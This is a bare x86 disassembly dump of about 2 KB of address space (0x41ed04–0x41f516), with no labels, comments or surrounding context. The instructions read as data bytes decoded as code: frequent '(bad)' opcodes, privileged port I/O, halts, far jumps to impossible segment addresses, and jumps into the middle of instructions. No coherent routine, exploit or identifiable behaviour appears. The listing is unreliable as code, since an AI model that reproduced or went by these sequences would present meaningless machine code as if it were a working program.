  41ed04:	cmc    
  41ed05:	sti    
  41ed06:	into   
  41ed07:	cld    
  41ed08:	scas   al,BYTE PTR es:[edi]
  41ed09:	jecxz  0x41ecb0
  41ed0b:	mov    dh,0xe4
  41ed0d:	rol    eax,cl
  41ed0f:	sar    ebx,1
  41ed11:	push   esi
  41ed13:	(bad)  
  41ed15:	retf   
  41ed16:	dec    edx
  41ed18:	stc    
  41ed19:	out    dx,al
  41ed1a:	add    dh,dh
  41ed1c:	add    eax,0xe3dff7fe
  41ed21:	or     ecx,DWORD PTR [eax]
  41ed23:	aam    0xe6
  41ed25:	(bad)  
  41ed27:	int    0xe6
  41ed29:	ret    
  41ed2a:	shl    DWORD PTR [ebp+eiz*8-0x3f051b4c],cl
  41ed31:	scas   al,BYTE PTR es:[edi]
  41ed32:	retf   
  41ed33:	shl    BYTE PTR [edi-0x33064036],cl
  41ed39:	ret    0x6b5
  41ed3c:	sar    al,cl
  41ed3e:	jmp    0xe6c5:0xfb00d0c5
  41ed45:	int    0xdf
  41ed47:	stc    
  41ed48:	out    dx,eax
  41ed49:	icebp  
  41ed4a:	out    0xc3,al
  41ed4c:	jmp    0xec04ba1c
  41ed51:	fdiv   st,st(2)
  41ed53:	in     al,dx
  41ed54:	(bad)  
  41ed55:	les    edi,FWORD PTR [ebx-0x2e251614]
  41ed5b:	test   esi,0xc5d8defb
  41ed61:	aam    0xf5
  41ed63:	std    
  41ed64:	cli    
  41ed65:	add    ebp,eax
  41ed67:	fucomp st(0)
  41ed69:	test   eax,0xe0e4cec8
  41ed6e:	repnz loope 0x41ed64
  41ed71:	(bad)  
  41ed72:	in     al,0xd5
  41ed74:	mov    bh,0xe8
  41ed76:	fdivr  st(2),st
  41ed78:	mov    ebx,0xfbc303c3
  41ed7d:	loope  0x41ed41
  41ed7f:	loop   0x41ed40
  41ed81:	in     al,0xc8
  41ed83:	loopne 0x41ed4c
  41ed85:	out    0xe7,al
  41ed87:	or     ebp,edx
  41ed89:	repnz test ebx,0xf0cfc2e3
  41ed90:	mov    ch,0xd2
  41ed92:	fcmovu st,st(6)
  41ed94:	in     al,0xfa
  41ed96:	mov    ah,0xbe
  41ed98:	cli    
  41ed99:	(bad)  
  41ed9a:	sti    
  41ed9b:	repnz (bad) 
  41ed9e:	sti    
  41ed9f:	retf   0xe8d5
  41eda2:	out    0xd6,eax
  41eda4:	(bad)  
  41eda5:	loopne 0x41edae
  41eda7:	leave  
  41eda8:	repnz into 
  41edaa:	fsubp  st(4),st
  41edac:	scas   eax,DWORD PTR es:[edi]
  41edad:	loopne 0x41ed76
  41edaf:	out    dx,al
  41edb0:	vpminsw xmm6,xmm1,xmm2
  41edb4:	mov    ah,0xee
  41edb6:	(bad)  
  41edb7:	(bad)  
  41edb9:	out    dx,al
  41edba:	add    dh,bh
  41edbc:	clc    
  41edbd:	jmp    ecx
  41edbf:	mov    DWORD PTR [esi+ebx*8],0xcacdcbdf
  41edc6:	push   cs
  41edc7:	or     bl,dl
  41edc9:	lock ret 
  41edcb:	rcl    esi,0xef
  41edce:	(bad)  
  41edcf:	in     eax,0xd0
  41edd1:	loopne 0x41edb2
  41edd3:	mov    edx,0xb4edf9ed
  41edd8:	shl    BYTE PTR [esi+0x7e1d8f9],cl
  41edde:	hlt    
  41eddf:	fiadd  WORD PTR [eax]
  41ede1:	add    bh,cl
  41ede3:	fadd   st(4),st
  41ede5:	out    dx,al
  41ede6:	fucomp st(3)
  41ede8:	ret    0xe8ed
  41edeb:	jmp    0x41eda2
  41eded:	mov    esp,0xd8cdd4f3
  41edf2:	(bad)  
  41edf3:	mov    ah,0xee
  41edf5:	(bad)  
  41edf7:	sar    DWORD PTR [esp+ebx*8-0x1b280c23],1
  41edfe:	add    BYTE PTR [ebx],cl
  41ee00:	aad    0xf8
  41ee02:	loopne 0x41edf8
  41ee04:	aam    0xc6
  41ee06:	fiadd  DWORD PTR [ecx]
  41ee08:	shr    eax,0xee
  41ee0b:	jecxz  0x41edb9
  41ee0d:	aam    0xe4
  41ee0f:	jmp    0x41edcb
  41ee11:	lock cmc 
  41ee13:	fmulp  st(1),st
  41ee15:	leave  
  41ee16:	in     al,dx
  41ee17:	fadd   DWORD PTR [ebx]
  41ee19:	imul   ah
  41ee1b:	stc    
  41ee1c:	hlt    
  41ee1d:	jmp    0x41edf1
  41ee1f:	jecxz  0x41ee19
  41ee21:	(bad)  
  41ee23:	(bad)  
  41ee25:	add    al,bh
  41ee27:	cld    
  41ee28:	scas   al,BYTE PTR es:[edi]
  41ee29:	leave  
  41ee2a:	fucomip st,st(2)
  41ee2c:	(bad)  
  41ee2d:	jmp    0xf8d2:0xb7ebd7bb
  41ee34:	jmp    0x41ee2a
  41ee36:	jmp    0xbdf3:0xefb6bfc3
  41ee3d:	repnz hlt 
  41ee3f:	push   es
  41ee40:	fisttp WORD PTR [ecx]
  41ee42:	xlat   BYTE PTR ds:[ebx]
  41ee43:	fucomip st,st(6)
  41ee45:	or     edi,edi
  41ee47:	add    cl,bl
  41ee49:	scas   eax,DWORD PTR es:[edi]
  41ee4a:	mov    ebp,0xf5b5b5e2
  41ee4f:	mov    bh,0xd4
  41ee51:	fnstenv [ebp+0x2dfb9cc]
  41ee57:	mov    ebp,0xf7d5cc02
  41ee5c:	clc    
  41ee5d:	(bad)  
  41ee60:	in     eax,0x7
  41ee62:	add    BYTE PTR [esi],al
  41ee64:	in     al,0xb
  41ee66:	add    esp,esp
  41ee68:	jecxz  0x41ee17
  41ee6a:	div    DWORD PTR [ebx-0x4b191a49]
  41ee70:	(bad)  
  41ee71:	jmp    0xbecf:0xd8d4fdc4
  41ee78:	fdivr  st,st(4)
  41ee7a:	int3   
  41ee7b:	(bad)  
  41ee7c:	aad    0xf9
  41ee7e:	clc    
  41ee7f:	ret    
  41ee80:	icebp  
  41ee81:	mov    esi,0xafff50a
  41ee86:	out    0xe9,eax
  41ee88:	fnsave [eax-0x14435b09]
  41ee8e:	call   0xb7fda184
  41ee93:	(bad)  
  41ee94:	mov    ch,0xbc
  41ee96:	in     al,dx
  41ee97:	cli    
  41ee98:	ret    
  41ee99:	jecxz  0x41ee9e
  41ee9b:	ffree  st(7)
  41ee9d:	stc    
  41ee9e:	out    0xca,al
  41eea0:	out    0x8,eax
  41eea2:	jmp    0xeefd:0xc1cfc3c4
  41eea9:	mov    ebp,0xe2cfbdce
  41eeae:	repnz mov al,0xd1
  41eeb1:	int3   
  41eeb2:	sar    esi,1
  41eeb4:	fcmovnu st,st(6)
  41eeb6:	(bad)  
  41eeb7:	(bad)  
  41eeb8:	jmp    0xdc37d58f
  41eebd:	in     al,dx
  41eebe:	rol    dh,0xca
  41eec1:	pminub mm3,mm6
  41eec4:	in     al,dx
  41eec5:	enter  0xe9f2,0xca
  41eec9:	scas   al,BYTE PTR es:[edi]
  41eeca:	test   eax,0xb1f0f2b1
  41eecf:	stc    
  41eed0:	mov    ebx,0xddc6d8cc
  41eed5:	fcmovbe st,st(5)
  41eed7:	iret   
  41eed8:	fsubr  st(3),st
  41eeda:	mov    eax,0xd8e5f2c1
  41eedf:	fcmove st,st(2)
  41eee1:	(bad)  
  41eee3:	cmc    
  41eee4:	(bad)  
  41eee5:	enter  0xe6e6,0xc6
  41eee9:	jmp    0x41eed4
  41eeeb:	jmp    0xb9ba:0xc5b5c2e5
  41eef2:	shr    eax,1
  41eef4:	mov    edx,0xd1ced3bd
  41eef9:	in     eax,dx
  41eefa:	(bad)  
  41eefc:	int    0xba
  41eefe:	or     edi,esp
  41ef00:	or     ah,ah
  41ef02:	or     al,ch
  41ef04:	fcmovnu st,st(5)
  41ef06:	jmp    0xe115b115
  41ef0b:	leave  
  41ef0c:	mov    esp,0xf3c8c1d1
  41ef11:	repnz mov bh,0xe4
  41ef14:	fnstsw WORD PTR [ebp-0x1e33fe38]
  41ef1a:	mov    esi,0xd4fefff6
  41ef1f:	or     al,BYTE PTR [eax]
  41ef21:	pop    es
  41ef22:	or     ch,dl
  41ef24:	retf   0xfa02
  41ef27:	fild   QWORD PTR [eax-0xf0a3030]
  41ef2d:	shr    edi,cl
  41ef2f:	leave  
  41ef30:	clc    
  41ef31:	les    esi,FWORD PTR [ebp-0x2a370a26]
  41ef37:	cli    
  41ef38:	add    DWORD PTR [eax],eax
  41ef3a:	aam    0x6
  41ef3c:	mov    esp,0xd5df02bd
  41ef41:	idiv   edi
  41ef43:	fstp   st(0)
  41ef45:	int3   
  41ef46:	or     dh,cl
  41ef48:	mov    edi,0xaef3e4cf
  41ef4d:	jmp    0xe5d8:0xb8e8ebe7
  41ef54:	fdivp  st(6),st
  41ef56:	mov    ecx,0xcfd8dae8
  41ef5b:	fsub   st,st(6)
  41ef5d:	add    bl,dl
  41ef5f:	or     al,bh
  41ef61:	jmp    0xc723de5f
  41ef66:	repnz icebp 
  41ef68:	shr    esp,1
  41ef6a:	out    0xb6,eax
  41ef6c:	enter  0xf2e5,0xfa
  41ef70:	mov    edx,0xf9ebe4b8
  41ef75:	mov    ecx,0xb6fbf9ca
  41ef7a:	ret    0xbdc6
  41ef7d:	jecxz  0x41ef86
  41ef7f:	std    
  41ef80:	out    0xd0,eax
  41ef82:	mov    DWORD PTR [eax*8-0x5821f7f4],0xcfc0b7e0
  41ef8d:	loope  0x41ef73
  41ef8f:	lods   al,BYTE PTR ds:[esi]
  41ef90:	imul   eax
  41ef92:	jmp    0xcb1ba68a
  41ef97:	clc    
  41ef98:	(bad)  
  41ef9a:	rol    BYTE PTR [ebx],0xfd
  41ef9d:	cmc    
  41ef9e:	out    0xea,eax
  41efa0:	jmp    0xec0ff6b0
  41efa5:	enter  0xf8f9,0xc4
  41efa9:	repnz out 0xc7,eax
  41efac:	int    0xfb
  41efae:	lods   eax,DWORD PTR ds:[esi]
  41efaf:	in     eax,dx
  41efb0:	in     eax,0xf0
  41efb2:	mov    dh,0xe5
  41efb4:	mov    edi,0xc2dddfce
  41efb9:	enter  0xf7c1,0xc1
  41efbd:	in     al,dx
  41efbe:	loop   0x41efb7
  41efc0:	cli    
  41efc1:	jmp    0xda3cf7ab
  41efc6:	in     al,dx
  41efc7:	fadd   st,st(1)
  41efc9:	mov    ch,0xec
  41efcc:	jmp    0xda23eabd
  41efd1:	(bad)  
  41efd2:	out    0xb9,eax
  41efd4:	in     al,dx
  41efd5:	inc    DWORD PTR [edx]
  41efd7:	aam    0xed
  41efd9:	sar    esi,cl
  41efdb:	(bad)  
  41efdd:	fcomp  st(1)
  41efdf:	push   es
  41efe0:	cmc    
  41efe1:	aad    0xf9
  41efe3:	or     DWORD PTR ds:0xb1e1e7c8,eax
  41efe9:	jmp    0xf231e3b4
  41efee:	(bad)  
  41efef:	leave  
  41eff0:	stc    
  41eff1:	(bad)  
  41eff3:	shl    ch,cl
  41eff5:	leave  
  41eff6:	icebp  
  41eff7:	out    dx,eax
  41eff8:	add    eax,eax
  41effa:	add    eax,DWORD PTR [eax]
  41effc:	loopne 0x41eff8
  41effe:	fadd   DWORD PTR [ecx]
  41f000:	(bad)  
  41f001:	psubb  mm0,QWORD PTR [edi+eiz*8]
  41f005:	or     ebx,ecx
  41f007:	shl    bh,0xf2
  41f00a:	jmp    0xd129c6e1
  41f00f:	out    dx,eax
  41f010:	lock out 0xc8,eax
  41f013:	hlt    
  41f014:	fcmovne st,st(0)
  41f016:	hlt    
  41f017:	fdivr  DWORD PTR [eax-0x43470a08]
  41f01d:	in     al,dx
  41f01e:	add    eax,0xe6f5d0d1
  41f023:	(bad)
  41f026:	sti    
  41f027:	adc    esp,edi
  41f029:	call   0xea34af1e
  41f02e:	test   eax,0xd9fad2c7
  41f033:	idiv   esi
  41f035:	jmp    0x41f00f
  41f037:	jecxz  0x41f008
  41f039:	out    dx,eax
  41f03a:	cld    
  41f03b:	(bad)  
  41f03c:	mov    esp,0xdb09fcf4
  41f041:	fdivrp st(7),st
  41f043:	fimul  WORD PTR [ecx]
  41f045:	in     eax,0x7
  41f047:	or     DWORD PTR [edx-0xb280d3d],ebp
  41f04d:	(bad)
  41f050:	mov    ch,0xb5
  41f052:	mov    eax,0xd403decf
  41f057:	mov    edi,0xf8f5f5cd
  41f05c:	repnz rol BYTE PTR [edx],0xe4
  41f060:	loopne 0x41f03f
  41f062:	dec    ecx
  41f064:	ret    
  41f065:	(bad)  
  41f067:	rcr    dh,cl
  41f069:	mov    bl,0xe5
  41f06b:	fsubp  st(2),st
  41f06d:	out    dx,eax
  41f06e:	loop   0x41f032
  41f070:	mov    bh,0xb5
  41f072:	mov    edx,0xfccff4e9
  41f077:	add    ecx,eax
  41f079:	(bad)  
  41f07b:	loop   0x41f064
  41f07d:	(bad)
  41f081:	fdivr  st(6),st
  41f083:	push   cs
  41f084:	or     eax,0xa8ebe5e9
  41f089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f08a:	rcr    ah,0xe5
  41f08d:	iret   
  41f08e:	(bad)  
  41f08f:	fidivr DWORD PTR [edx-0x3b4f313b]
  41f095:	enter  0xe9f8,0xb9
  41f099:	sti    
  41f09a:	out    0xe7,al
  41f09c:	cld    
  41f09d:	add    esp,edi
  41f09f:	or     cl,BYTE PTR [ebx]
  41f0a1:	std    
  41f0a2:	add    ch,ch
  41f0a4:	ret    
  41f0a5:	loop   0x41f076
  41f0a7:	jmp    0x41f06e
  41f0a9:	loopne 0x41f05d
  41f0ab:	in     al,0xd2
  41f0ad:	mov    dl,0xf0
  41f0af:	shr    esp,1
  41f0b1:	mov    edx,0xcdf4ead4
  41f0b6:	(bad)  
  41f0b7:	mov    edx,0xfdf5d4e1
  41f0bc:	repz (bad) 
  41f0c0:	neg    ebp
  41f0c2:	fcmovnu st,st(6)
  41f0c4:	out    0x2,eax
  41f0c6:	bswap  esp
  41f0c8:	call   0xafefb994
  41f0cd:	shl    al,1
  41f0cf:	xlat   BYTE PTR ds:[ebx]
  41f0d0:	call   0xcef7a2d0
  41f0d5:	mov    esi,0xeebbed02
  41f0da:	out    dx,al
  41f0db:	shl    al,1
  41f0dd:	add    ah,ch
  41f0df:	rol    edx,1
  41f0e1:	add    ch,bh
  41f0e3:	cli    
  41f0e4:	aam    0xf4
  41f0e6:	fadd   QWORD PTR [edx]
  41f0e8:	int    0xcd
  41f0ea:	jmp    0x41f0a8
  41f0ec:	leave  
  41f0ed:	ret    
  41f0ee:	int3   
  41f0ef:	test   esi,0xfdc8f1e4
  41f0f5:	icebp  
  41f0f6:	call   edx
  41f0f8:	mov    ebp,0xddd3c3be
  41f0fd:	shl    edx,cl
  41f0ff:	(bad)  
  41f100:	ret    
  41f101:	(bad)  
  41f103:	push   cs
  41f104:	fisttp DWORD PTR [edx]
  41f106:	sti    
  41f107:	out    0xc5,al
  41f109:	scas   eax,DWORD PTR es:[edi]
  41f10a:	mov    bl,0xbe
  41f10c:	loopne 0x41f0f3
  41f10e:	out    dx,al
  41f10f:	fidiv  DWORD PTR [edi-0x40191538]
  41f115:	shl    BYTE PTR [ecx-0x261d1711],cl
  41f11b:	add    eax,0xeae6bdf5
  41f120:	fiadd  WORD PTR ds:0xffebf6ee
  41f126:	(bad)  
  41f127:	inc    ch
  41f129:	mov    bl,0xc6
  41f12b:	out    0xea,eax
  41f12d:	mov    dh,0xf0
  41f12f:	retf   
  41f130:	rol    edi,1
  41f132:	inc    ah
  41f134:	(bad)  
  41f136:	jmp    0xd2fbed13
  41f13b:	f2xm1  
  41f13d:	mov    edx,0xe002f5ff
  41f142:	(bad)  
  41f143:	fiadd  DWORD PTR [ebx]
  41f145:	out    dx,al
  41f146:	les    eax,FWORD PTR [esp+eax*8]
  41f149:	repz repnz mov esp,0xd9ced7eb
  41f150:	rcl    al,cl
  41f152:	fcmovnb st,st(5)
  41f154:	fnstcw WORD PTR [ebx-0x49fd2030]
  41f15a:	add    ch,cl
  41f15c:	loop   0x41f139
  41f15e:	ret    0xf4f6
  41f161:	leave  
  41f162:	out    0xfa,al
  41f164:	loope  0x41f145
  41f166:	loopne 0x41f151
  41f168:	loop   0x41f146
  41f16a:	shr    BYTE PTR [edi-0x12133a54],0xd5
  41f171:	mov    dl,0xdb
  41f173:	into   
  41f174:	hlt    
  41f175:	jmp    0xeebe:0xee03e8ba
  41f17c:	(bad)  
  41f17d:	test   BYTE PTR [edx],0xd9
  41f180:	fisttp WORD PTR [ecx]
  41f182:	rcl    esi,0xc4
  41f185:	out    dx,eax
  41f186:	fild   DWORD PTR [eax]
  41f188:	stos   DWORD PTR es:[edi],eax
  41f189:	int3   
  41f18a:	shl    BYTE PTR [esi-0x43e0c55],cl
  41f190:	int3   
  41f191:	in     eax,0xad
  41f193:	fldln2 
  41f195:	jmp    0x41f17f
  41f197:	aad    0xf9
  41f199:	fchs   
  41f19b:	aam    0xec
  41f19d:	mov    esp,0xe301e1d7
  41f1a2:	hlt    
  41f1a3:	cmc    
  41f1a4:	or     ebx,eax
  41f1a6:	fimul  DWORD PTR [edx+eiz*8]
  41f1a9:	(bad)
  41f1ac:	(bad)  
  41f1ae:	retf   
  41f1af:	mov    cl,0xef
  41f1b1:	stc    
  41f1b2:	out    0xba,eax
  41f1b4:	int    0xdf
  41f1b6:	int    0xe2
  41f1b8:	enter  0xefd4,0xf2
  41f1bc:	add    bl,al
  41f1be:	jmp    0xc809:0xc605e8df
  41f1c5:	or     bh,bh
  41f1c7:	int3   
  41f1c8:	ret    
  41f1c9:	lds    ebp,FWORD PTR [edi-0x3b49510b]
  41f1cf:	into   
  41f1d0:	test   bl,0xf3
  41f1d3:	(bad)  
  41f1d4:	out    dx,al
  41f1d5:	clc    
  41f1d6:	mov    ecx,0xc3fed4d2
  41f1db:	int3   
  41f1dc:	shl    cl,1
  41f1de:	add    al,0xa
  41f1e0:	push   es
  41f1e1:	retf   
  41f1e2:	or     bl,bh
  41f1e4:	loop   0x41f1e2
  41f1e6:	in     al,0xe8
  41f1e8:	shl    bh,1
  41f1ea:	retf   0xd7e5
  41f1ed:	in     al,0xee
  41f1ef:	sar    bl,cl
  41f1f1:	jmp    0x41f1a8
  41f1f3:	mov    dh,0xdc
  41f1f5:	icebp  
  41f1f6:	mov    ebx,0xeedfb7b9
  41f1fb:	mov    edi,0xe1f7e101
  41f200:	jecxz  0x41f1c0
  41f202:	jecxz  0x41f1f2
  41f204:	leave  
  41f205:	fcom   QWORD PTR [ebx]
  41f207:	repnz rol al,0xca
  41f20b:	out    0xf0,eax
  41f20d:	out    dx,al
  41f20e:	shl    ebp,0xe5
  41f211:	idiv   bl
  41f213:	jmp    0x41f1c9
  41f215:	repnz (bad) 
  41f218:	mov    edi,0xd6f8edf8
  41f21d:	fucom  st(0)
  41f21f:	jmp    0xfd3ac800
  41f224:	or     al,0xe0
  41f226:	out    0xc8,eax
  41f228:	(bad)  
  41f229:	jmp    0xf6b0:0xc1e3cfad
  41f230:	out    0xd3,eax
  41f232:	shl    ebx,1
  41f234:	mov    ebx,0xc8f903fd
  41f239:	stc    
  41f23a:	icebp  
  41f23b:	lock loopne 0x41f21e
  41f23e:	ret    0xcadf
  41f241:	jmp    0xe4cf:0x50ffeff
  41f248:	jmp    0xc6e5:0xf3e2dfc1
  41f24f:	jmp    0xffd6:0xacffb2c8
  41f256:	mov    ebp,0xf5b9f5d4
  41f25b:	loopne 0x41f232
  41f25d:	add    ch,ah
  41f25f:	bnd jmp 0xe840ee5d
  41f265:	int    0xca
  41f267:	adc    ecx,esp
  41f269:	jmp    0xd6ffb32f
  41f26e:	mov    bh,0xd6
  41f270:	int3   
  41f271:	sti    
  41f272:	mov    ebx,0xf3fef8d2
  41f277:	mov    esi,0xd4e100bd
  41f27c:	add    al,0x4
  41f27e:	push   es
  41f27f:	add    ebp,eax
  41f281:	rol    ch,0xeb
  41f284:	retf   
  41f285:	enter  0xd8e7,0xf0
  41f289:	fsubrp st(4),st
  41f28b:	imul   cl
  41f28d:	shl    BYTE PTR [eax-0x1a370b1c],cl
  41f293:	(bad)  
  41f294:	call   0xbeffbe81
  41f299:	ret    
  41f29a:	out    dx,eax
  41f29b:	jecxz  0x41f299
  41f29d:	sti    
  41f29e:	fdiv   st,st(6)
  41f2a0:	aad    0x7
  41f2a2:	rcr    edi,0xd8
  41f2a5:	in     eax,dx
  41f2a6:	add    BYTE PTR [eax],al
  41f2a8:	retf   0xc9b8
  41f2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2ac:	aam    0xbc
  41f2ae:	fcmove st,st(5)
  41f2b0:	jmp    0xfbef:0xcab5d3ea
  41f2b7:	int3   
  41f2b8:	sti    
  41f2b9:	mov    esi,0xfcf6f0ed
  41f2be:	cld    
  41f2bf:	ror    DWORD PTR [edx],1
  41f2c1:	std    
  41f2c2:	fucomp st(7)
  41f2c4:	jecxz  0x41f2a0
  41f2c6:	call   0xce03bba4
  41f2cb:	retf   
  41f2cc:	ret    
  41f2cd:	int3   
  41f2ce:	loop   0x41f2bc
  41f2d0:	in     al,0xc6
  41f2d2:	push   DWORD PTR [edi-0x2c093332]
  41f2d8:	mov    esp,0xbcd5ddd8
  41f2dd:	mov    esp,0x3f5f5d4
  41f2e2:	iret   
  41f2e3:	std    
  41f2e4:	ret    
  41f2e5:	or     dh,ch
  41f2e7:	or     esp,ebp
  41f2e9:	lock test eax,0xd7efcbe3
  41f2ef:	(bad)  
  41f2f0:	test   eax,0xf5e8f1b8
  41f2f6:	enter  0xefc9,0xdd
  41f2fa:	sti    
  41f2fb:	out    0xcd,eax
  41f2fd:	sar    ebp,cl
  41f2ff:	mul    al
  41f301:	ret    0xefff
  41f304:	(bad)  
  41f305:	fisttp WORD PTR ds:0xacb8b208
  41f30b:	icebp  
  41f30c:	not    ebx
  41f30e:	rcr    ecx,0xc4
  41f311:	sti    
  41f312:	ror    bh,1
  41f314:	(bad)  
  41f315:	fyl2xp1 
  41f317:	jmp    0xcf04b70f
  41f31c:	fidivr WORD PTR [edx+esi*8-0x142b36f5]
  41f323:	les    eax,FWORD PTR [edx]
  41f325:	jecxz  0x41f328
  41f327:	in     al,dx
  41f328:	loopne 0x41f317
  41f32a:	int3   
  41f32b:	leave  
  41f32c:	test   cl,0xe0
  41f32f:	ret    0xd8c4
  41f332:	out    dx,eax
  41f333:	retf   0xbdff
  41f336:	jecxz  0x41f325
  41f338:	mov    bh,0x1
  41f33a:	cmc    
  41f33b:	ret    
  41f33c:	shr    bl,1
  41f33e:	out    0xda,al
  41f340:	add    eax,0x2c70f01
  41f345:	iret   
  41f346:	int    0x8
  41f348:	mov    ecx,0xbce2dcd0
  41f34d:	in     al,dx
  41f34e:	(bad)  
  41f34f:	in     eax,dx
  41f350:	lock mov bh,0xfe
  41f353:	fxam   
  41f355:	retf   
  41f356:	mov    edx,0xefdfbbf8
  41f35b:	add    bl,dl
  41f35d:	lock aam 0xd9
  41f360:	push   es
  41f361:	jmp    0x41f359
  41f363:	fucomp st(7)
  41f365:	dec    BYTE PTR [edi]
  41f367:	loopne 0x41f333
  41f369:	(bad)  
  41f36a:	shl    DWORD PTR [edi-0x4d382b44],cl
  41f370:	icebp  
  41f371:	jmp    0x41f33e
  41f373:	fcmove st,st(3)
  41f375:	mov    ebp,0xc8f4e2bb
  41f37a:	rol    al,0xd9
  41f37d:	(bad)  
  41f37f:	or     ch,bl
  41f381:	jmp    0x41f348
  41f383:	out    dx,eax
  41f384:	in     al,dx
  41f385:	retf   
  41f386:	clc    
  41f387:	adc    eax,esp
  41f389:	ffreep st(3)
  41f38b:	shr    BYTE PTR [esi-0x10380f36],cl
  41f391:	neg    edx
  41f393:	mov    ch,0xde
  41f395:	jmp    0xd635d679
  41f39a:	in     al,dx
  41f39b:	(bad)  
  41f39c:	(bad)  
  41f39d:	hlt    
  41f39e:	loope  0x41f39b
  41f3a0:	rcl    ah,0xd6
  41f3a3:	add    al,0xfb
  41f3a5:	inc    DWORD PTR [edx]
  41f3a7:	in     al,0xc0
  41f3a9:	jmp    0x41f36a
  41f3ab:	in     eax,0xd7
  41f3ad:	ret    0xcfa9
  41f3b0:	loopne 0x41f3a4
  41f3b2:	out    dx,al
  41f3b3:	fxch   st(5)
  41f3b5:	lock jmp 0x41f377
  41f3b8:	add    esp,ecx
  41f3ba:	clc    
  41f3bb:	fdivr  st,st(1)
  41f3bd:	aam    0x0
  41f3bf:	add    dl,al
  41f3c1:	mov    BYTE PTR [esi+ebx*8],0xe2
  41f3c5:	enter  0xeef,0xeb
  41f3c9:	icebp  
  41f3ca:	icebp  
  41f3cb:	in     al,dx
  41f3cc:	(bad)  
  41f3ce:	mov    dh,0xc1
  41f3d0:	out    dx,eax
  41f3d1:	(bad)
  41f3d4:	mov    ecx,0xe9ddf8c4
  41f3d9:	add    BYTE PTR [edi],al
  41f3db:	add    dh,cl
  41f3dd:	cld    
  41f3de:	add    ecx,esi
  41f3e0:	icebp  
  41f3e1:	add    ecx,ecx
  41f3e3:	cld    
  41f3e4:	sti    
  41f3e5:	ret    0xcbcd
  41f3e8:	lods   eax,DWORD PTR ds:[esi]
  41f3e9:	leave  
  41f3ea:	in     al,dx
  41f3eb:	into   
  41f3ec:	in     al,0xce
  41f3ee:	mov    ebx,0xbfefd6b4
  41f3f3:	(bad)  
  41f3f4:	repnz repz retf 
  41f3f7:	(bad)  
  41f3f8:	shl    dl,1
  41f3fa:	loopne 0x41f3f6
  41f3fc:	rol    dh,0xdf
  41f3ff:	jecxz  0x41f3c2
  41f401:	fmulp  st(1),st
  41f403:	or     eax,0xfacccef5
  41f408:	lods   al,BYTE PTR ds:[esi]
  41f409:	mov    eax,0xb6d2eed6
  41f40e:	mov    cl,0xd2
  41f410:	xlat   BYTE PTR ds:[ebx]
  41f411:	mov    cl,0xf0
  41f413:	lock mov ah,0xeb
  41f416:	stc    
  41f417:	xlat   BYTE PTR ds:[ebx]
  41f418:	in     eax,dx
  41f419:	int3   
  41f41a:	hlt    
  41f41b:	repz hlt 
  41f41d:	mov    esp,0xe203d6e1
  41f422:	fucomp st(2)
  41f424:	out    dx,al
  41f425:	(bad)  
  41f426:	loopne 0x41f402
  41f428:	lock test al,0xb1
  41f42b:	mov    dl,0xdd
  41f42d:	out    dx,eax
  41f42e:	shl    esi,1
  41f430:	(bad)  
  41f432:	mov    ch,0xc4
  41f434:	(bad)
  41f437:	int3   
  41f438:	in     al,dx
  41f439:	fsubrp st(1),st
  41f43b:	sti    
  41f43c:	sti    
  41f43d:	ret    
  41f43e:	lock std 
  41f440:	cli    
  41f441:	retf   0xdd09
  41f444:	add    ecx,ebx
  41f446:	repz clc 
  41f448:	int3   
  41f449:	jecxz  0x41f419
  41f44b:	mov    al,0xf5
  41f44d:	repnz in eax,0xc5
  41f450:	in     eax,dx
  41f451:	mov    bh,0xdf
  41f453:	leave  
  41f454:	iret   
  41f455:	(bad)  
  41f456:	stc    
  41f457:	loop   0x41f456
  41f459:	in     al,dx
  41f45a:	mov    edi,0xd407dfdd
  41f45f:	push   es
  41f460:	icebp  
  41f461:	in     al,0xcf
  41f463:	(bad)  
  41f464:	loopne 0x41f44e
  41f466:	add    al,0xf1
  41f468:	leave  
  41f469:	mov    bl,0xeb
  41f46b:	ret    
  41f46c:	ret    
  41f46d:	loope  0x41f462
  41f46f:	shl    edi,1
  41f471:	(bad)  
  41f473:	shl    esp,1
  41f475:	aad    0xd3
  41f477:	mov    al,0xc2
  41f479:	loop   0x41f482
  41f47b:	xlat   BYTE PTR ds:[ebx]
  41f47c:	mov    ebx,0xf706b9fe
  41f481:	mov    esi,0xfbfde8d9
  41f486:	fild   WORD PTR [ecx]
  41f488:	repz jmp 0xd522ec7c
  41f48e:	int3   
  41f48f:	in     eax,dx
  41f490:	mov    bh,0xf1
  41f492:	in     al,dx
  41f493:	(bad)  
  41f495:	not    bl
  41f497:	(bad)  
  41f498:	(bad)  
  41f49a:	stc    
  41f49b:	fsub   st,st(0)
  41f49d:	int3   
  41f49e:	idiv   bl
  41f4a0:	call   0xc606daa8
  41f4a5:	or     al,0xe5
  41f4a7:	into   
  41f4a8:	mov    esi,0xe6ddf3ef
  41f4ad:	stos   BYTE PTR es:[edi],al
  41f4ae:	mov    ebx,0xcaffeae2
  41f4b3:	(bad)  
  41f4b5:	in     eax,dx
  41f4b6:	sar    BYTE PTR [esi+edx*8-0xf200331],cl
  41f4bd:	std    
  41f4be:	push   es
  41f4bf:	ret    0xf9de
  41f4c2:	(bad)  
  41f4c5:	jmp    0xd5ed:0xe2c602fa
  41f4cc:	mov    bl,0xe6
  41f4ce:	aam    0xd9
  41f4d0:	mov    ecx,0xf5b7dfd0
  41f4d5:	fstp   st(7)
  41f4d7:	in     eax,dx
  41f4d8:	(bad)  
  41f4d9:	sti    
  41f4da:	mov    ebp,0x2bad0f0
  41f4df:	sti    
  41f4e0:	leave  
  41f4e1:	hlt    
  41f4e2:	(bad)  
  41f4e3:	out    dx,al
  41f4e4:	std    
  41f4e5:	retf   
  41f4e6:	sti    
  41f4e7:	std    
  41f4e8:	enter  0xe0c5,0xde
  41f4ec:	cmc    
  41f4ed:	div    ebp
  41f4ef:	leave  
  41f4f0:	fdiv   st,st(5)
  41f4f2:	rcl    ebx,cl
  41f4f4:	int    0xdc
  41f4f6:	into   
  41f4f7:	fcomip st,st(4)
  41f4f9:	hlt    
  41f4fa:	ret    0xbfd1
  41f4fd:	sti    
  41f4fe:	stc    
  41f4ff:	mov    eax,0xc4c0fec0
  41f504:	sti    
  41f505:	fsubrp st(0),st
  41f507:	std    
  41f508:	fmul   st,st(6)
  41f50a:	jmp    0x41f4f5
  41f50c:	lods   al,BYTE PTR ds:[esi]
  41f50d:	aad    0xc4
  41f50f:	sti    
  41f510:	cli    
  41f511:	lock fcmovbe st,st(0)
  41f514:	in     eax,0xf4
  41f516:	xlat   BYTE PTR ds:[ebx]
